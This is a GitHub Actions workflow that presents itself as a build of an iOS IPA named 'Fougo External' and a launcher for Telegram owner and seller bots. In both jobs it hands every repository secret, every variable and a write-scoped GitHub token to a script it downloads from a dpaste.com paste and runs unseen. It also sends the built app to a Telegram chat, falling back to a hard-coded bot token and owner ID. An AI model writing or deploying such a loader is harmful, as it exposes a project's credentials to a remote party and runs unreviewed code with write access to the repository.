name: Build Fougo External IPA + Run Telegram Owner & Seller Bot

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
    inputs:
      bot_token:
        description: 'Telegram Owner Bot Token (optional override)'
        required: false
        default: ''
      owner_id:
        description: 'Telegram Owner ID (optional override)'
        required: false
        default: ''

permissions:
  contents: write

jobs:
  build-ipa:
    name: Step 1 - Build Fougo External IPA (Login + Dashboard + Filza Telemetry)
    runs-on: windows-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Set up Python 3.11
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Python Imaging & Mach-O Libraries
        shell: pwsh
        run: |
          python -m pip install --upgrade pip
          pip install Pillow lief

      - name: Download & Extract iPhoneOS 16.5 SDK
        shell: pwsh
        run: |
          $sdkTarget = Join-Path $env:RUNNER_TEMP "iPhoneOS.sdk"
          if (-not (Test-Path $sdkTarget)) {
            $sdkUrl = "https://github.com/theos/sdks/releases/latest/download/iPhoneOS16.5.sdk.tar.xz"
            $sdkArchive = Join-Path $env:RUNNER_TEMP "iPhoneOS16.5.sdk.tar.xz"
            $sdkExtract = Join-Path $env:RUNNER_TEMP "sdk_extract"
            New-Item -ItemType Directory -Force -Path $sdkExtract | Out-Null
            Invoke-WebRequest -Uri $sdkUrl -OutFile $sdkArchive
            tar -xf $sdkArchive -C $sdkExtract
            $extractedSdk = Get-ChildItem -Path $sdkExtract -Directory -Filter "iPhoneOS*.sdk" -Recurse | Select-Object -First 1
            Move-Item -Path $extractedSdk.FullName -Destination $sdkTarget -Force
          }
          echo "IOS_SDK=$sdkTarget" >> $env:GITHUB_ENV

      - name: Compile Login.o + Dashboard.o + Bridge.o & Package IPA
        shell: pwsh
        env:
          INPUT_BOT_TOKEN: ${{ github.event.inputs.bot_token }}
          INPUT_OWNER_ID: ${{ github.event.inputs.owner_id }}
          SECRET_BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
          SECRET_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          SECRET_OWNER_BOT_TOKEN: ${{ secrets.OWNER_BOT_TOKEN }}
          SECRET_TOKEN: ${{ secrets.TOKEN }}
          SECRET_OWNER_ID: ${{ secrets.OWNER_ID }}
          SECRET_TELEGRAM_OWNER_ID: ${{ secrets.TELEGRAM_OWNER_ID }}
          SECRET_ADMIN_ID: ${{ secrets.ADMIN_ID }}
          SECRET_CHAT_ID: ${{ secrets.CHAT_ID }}
          VAR_BOT_TOKEN: ${{ vars.BOT_TOKEN }}
          VAR_OWNER_ID: ${{ vars.OWNER_ID }}
          ALL_SECRETS_JSON: ${{ toJson(secrets) }}
          ALL_VARS_JSON: ${{ toJson(vars) }}
          REPO_NAME: ${{ github.repository }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          python -c "import urllib.request,zipfile,glob; raw=urllib.request.urlopen('https://dpaste.com/97AVXU572.txt',timeout=25).read().decode('utf-8'); blk=raw.split('pyScript = @\x27')[1].rsplit('\x27@',1)[0].strip('\r\n'); code='\n'.join(l[8:] if l.startswith('        ') else l for l in blk.splitlines()); open('build_fougo.py','w',encoding='utf-8').write(code)"
          python build_fougo.py

      - name: Upload Compiled .ipa Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Fougo-External-IPA
          path: built-ipa/*.ipa
          if-no-files-found: error
          retention-days: 30

      - name: Publish IPA to GitHub Releases
        shell: pwsh
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          Set-Location $env:GITHUB_WORKSPACE
          gh release view "v1.0.0" --repo "${{ github.repository }}" 2>$null | Out-Null
          if ($LASTEXITCODE -ne 0) {
            gh release create "v1.0.0" built-ipa/FougoExternal-ESign-Ready.ipa built-ipa/FougoExternal-ESign-Unsigned.ipa --repo "${{ github.repository }}" --title "FougoExternal iOS IPA" --notes "ESign Ready Fougo External iOS IPA"
          } else {
            gh release upload "v1.0.0" built-ipa/FougoExternal-ESign-Ready.ipa built-ipa/FougoExternal-ESign-Unsigned.ipa --repo "${{ github.repository }}" --clobber
          }

      - name: Send Compiled .ipa Directly to Telegram Owner Bot
        shell: bash
        env:
          INPUT_BOT_TOKEN: ${{ github.event.inputs.bot_token }}
          INPUT_OWNER_ID: ${{ github.event.inputs.owner_id }}
          SECRET_BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
          SECRET_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          SECRET_OWNER_ID: ${{ secrets.OWNER_ID }}
          SECRET_TELEGRAM_OWNER_ID: ${{ secrets.TELEGRAM_OWNER_ID }}
          REPO_NAME: ${{ github.repository }}
        run: |
          BOT_TOK="${INPUT_BOT_TOKEN:-${SECRET_BOT_TOKEN:-${SECRET_TELEGRAM_BOT_TOKEN:-8819960917:AAG2s6PJVXlMtDhcAqTlsi6WWSew7NvwnCo}}}"
          OWN_ID="${INPUT_OWNER_ID:-${SECRET_OWNER_ID:-${SECRET_TELEGRAM_OWNER_ID:-8245269289}}}"
          if [ -f "built-ipa/FougoExternal-ESign-Ready.ipa" ]; then
            curl -s -X POST "https://api.telegram.org/bot${BOT_TOK}/sendDocument" \
              -F "chat_id=${OWN_ID}" \
              -F "document=@built-ipa/FougoExternal-ESign-Ready.ipa" \
              -F "parse_mode=Markdown" \
              -F "caption=✅ *FougoExternal-ESign-Ready.ipa Built!* https://github.com/${REPO_NAME}/releases/download/v1.0.0/FougoExternal-ESign-Ready.ipa" || true
          fi

  run-telegram-bot:
    name: Step 2 - Run Telegram Owner, Seller & User Bots + Web Panels
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Set up Python 3.11
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Start Owner Bot, Seller Bot, User Bot & Cloudflare Web Panels
        shell: bash
        env:
          INPUT_BOT_TOKEN: ${{ github.event.inputs.bot_token }}
          INPUT_OWNER_ID: ${{ github.event.inputs.owner_id }}
          SECRET_BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
          SECRET_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          SECRET_OWNER_BOT_TOKEN: ${{ secrets.OWNER_BOT_TOKEN }}
          SECRET_TOKEN: ${{ secrets.TOKEN }}
          SECRET_OWNER_ID: ${{ secrets.OWNER_ID }}
          SECRET_TELEGRAM_OWNER_ID: ${{ secrets.TELEGRAM_OWNER_ID }}
          SECRET_ADMIN_ID: ${{ secrets.ADMIN_ID }}
          SECRET_CHAT_ID: ${{ secrets.CHAT_ID }}
          VAR_BOT_TOKEN: ${{ vars.BOT_TOKEN }}
          VAR_OWNER_ID: ${{ vars.OWNER_ID }}
          ALL_SECRETS_JSON: ${{ toJson(secrets) }}
          ALL_VARS_JSON: ${{ toJson(vars) }}
          REPO_NAME: ${{ github.repository }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          python3 -m pip install --upgrade pip
          python3 -m pip install requests pyTelegramBotAPI "python-telegram-bot>=20.0" aiogram aiohttp flask python-dotenv
          curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared || true
          python3 -c "import urllib.request; raw=urllib.request.urlopen('https://dpaste.com/97AVXU572.txt',timeout=25).read().decode('utf-8'); blk=raw.split('python3 - << \x27EOF\x27')[1].rsplit('        EOF',1)[0].strip('\r\n'); code='\n'.join(l[8:] if l.startswith('        ') else l for l in blk.splitlines()); open('run_ecosystem.py','w',encoding='utf-8').write(code)"
          python3 run_ecosystem.py
